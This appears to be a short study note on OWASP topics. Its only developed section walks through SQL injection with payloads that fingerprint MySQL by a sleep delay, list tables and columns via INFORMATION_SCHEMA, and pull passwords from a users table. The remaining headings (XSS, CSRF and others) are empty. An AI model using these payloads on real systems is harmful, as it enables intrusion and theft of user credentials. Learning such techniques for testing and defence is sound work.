## OWASP
### SQL Injection
- Find the database
    Suppose a vulnerable website with a backend MySql database allows querying data like so
    ```bash
    $ SELECT col1, col2, col3 from <table> where <col> Like '%{user_input}%'
    ```
    We can verify its a Mysql Database by passing
    ```bash
    value' AND 1 == sleep(3);--
    ```
    If there is a delay in response due to sleep, then its a MySql database else keep trying for equivalent commands for other     database
 - Find other tables

    If we pass this value in the user field
    ```bash
    some_value' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.tables);--
    ```
    This will result in the follwing query getting executed in backend
    ```bash
    SELECT col1, col2, col3 from <table> where <col> Like '%some_value' 
    UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.tables);--%'
    ```
 - Query a sensitive table

    One way to randomly guess is to select from a particular table and execute a sleep. If the table exists then, you will see     delay in response else you will immediately see an error.

    OR

    pass below in user input to see the columns of the sensitive table
    ```bash
    some_value' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.columns WHERE TABLE_NAME='users');--
    ```
    Now you can query data from sensitive table
    ```bash
    some_value' UNION (SELECT user_password, address, 3 FROM users);--
    ```
  
    
- Javascript injection
- XSS
  - Reflective
  - persistent
- CSRF
- Broken authentication
- Privilege excalation
